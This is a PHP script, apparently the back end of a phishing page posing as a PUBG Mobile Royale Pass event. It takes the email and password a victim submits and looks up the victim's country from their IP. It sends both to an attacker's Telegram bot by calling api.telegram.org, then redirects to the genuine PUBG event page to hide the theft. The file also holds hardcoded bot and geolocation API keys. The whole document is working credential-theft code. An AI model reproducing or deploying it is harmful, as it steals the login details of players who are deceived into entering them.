<?php
header ('Location: https://pubgmobile.com/en/event/royalepass15');
$API_KEY = "1466373953:AAFgdOeQa23KaW3eOhJ5XewnNBqRg5Y7FOc";
?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api_key = "58acb67e9d9cf520867ccd4fc22e5fc3";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 $countryfromip = $jsondata->country_name;
 ?>
<?php
$admin = 760488294 ; 
$user = $_POST["email"];
$pass = $_POST["password"];
$login = $_POST["login"];
$tier = $_POST["tier"];
$time = date("Y-m-d H:i:s");
$text = urlencode("
❅─────✧❅✦❅✧──────❅
     ⊰᯽⊱DEXTER᯽⊱
❅─────✧❅✦❅✧──────❅
😃➥•𝐄𝐌𝐀𝐈𝐋 : $user
😃➥•𝐏𝐀𝐒𝐒 : $pass
😃➥•𝐋𝐎𝐆𝐈𝐍 : $login
😃➥•𝐂𝐎𝐔𝐍𝐓𝐑𝐘 : $countryfromip
😃➥•𝐓𝐈𝐌𝐄 : $time
-------------------
🇮🇶 𝐁𝐘 :- DEXTER
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>